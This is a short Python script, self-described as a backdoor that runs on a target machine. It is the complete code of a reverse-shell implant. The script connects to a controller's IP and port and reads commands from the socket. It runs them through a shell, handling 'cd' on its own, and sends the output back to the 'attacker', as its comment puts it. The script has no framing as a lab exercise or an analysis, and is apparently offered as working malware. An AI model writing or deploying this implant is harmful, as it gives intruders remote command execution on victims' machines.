#backdoor that runs on target machine
import socket
import json
import os
import sys
import subprocess
import threading
import time

ip = '127.0.0.1'
port = 4141

client = socket.socket()
client.connect((ip, port))
print("connected")

def execute_shell():
    while True:
        data = client.recv(1024)
        data = data.decode()
        print(f"command received: {data}")

        if data == 'quit':
            break
        #elif data == 'cd':


        
        try:
            print(data)
            command, params = data.split(" ", 1)
            print(command ,params)
            if command == "cd":
                os.chdir(params)
                print("chdir to %s" % (params))
                data = os.getcwd()
                print("continueing")
                continue
        except:
            print("failed to split")
            pass
        

        op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        #send response/output back to attacker
        #print(f"sending: {output.decode() + output_error.decode()}")
        print(f"sent output from command: {data}")
        print(output + output_error)
        client.send(output + output_error)
        

execute_shell()




